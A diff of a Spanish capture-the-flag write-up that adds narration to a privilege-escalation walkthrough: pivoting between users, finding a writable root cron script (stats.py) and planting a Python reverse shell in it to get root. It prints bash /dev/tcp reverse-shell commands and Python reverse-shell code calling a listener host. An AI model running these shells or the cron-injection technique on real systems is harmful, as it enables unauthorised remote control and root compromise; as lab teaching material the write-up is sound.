@@ -120,12 +120,15 @@ sudo -u coach /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```bash
 sudo -u nutritionist /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'
 ```
-
+Ahora somos el usuario nutricionist, este usuario no tiene ningún permiso sudo. Po ello, debemos buscar otra forma de escalar privilegios.
 <img width="1005" height="205" alt="15aleluya" src="https://github.com/user-attachments/assets/e03b9474-6b5f-4995-9562-5fbcf1f8b82a" />
+<br><br>
 
-
+Si miramos las tareas cron....
 <img width="1152" height="603" alt="16podriaser" src="https://github.com/user-attachments/assets/9c98e8f8-9491-4e7c-9fad-737ef27b7820" />
+<br><br>
 
+Leemos el fichero stats.py que vimos anteriormente que usa python3 para ejecutarlo como root, para ver que contiene. Este archivo podemos modificarlo asi que vamos a incluir una reverse shell en python3 para poder escalar a root.
 <img width="891" height="248" alt="16podriayes" src="https://github.com/user-attachments/assets/98dfcaac-dfa0-41b1-a178-2994c29df908" />
 
 ```bash
@@ -146,11 +149,13 @@ os.dup2(s.fileno(), 2)
 
 p = subprocess.call(["/bin/sh", "-i"])
 ```
-
-
-<img width="914" height="307" alt="18flag" src="https://github.com/user-attachments/assets/17c9a34e-01c7-4230-938f-cbfe57276251" />
 <br><br>
 <img width="1035" height="650" alt="porsi" src="https://github.com/user-attachments/assets/6a8eae5f-8615-40eb-b563-8074667172df" />
+<br><br>
+Somos root, ya podemos ir a su carpeta personal y leer la flag.txt
+
+<img width="914" height="307" alt="18flag" src="https://github.com/user-attachments/assets/17c9a34e-01c7-4230-938f-cbfe57276251" />
+
 
 
 
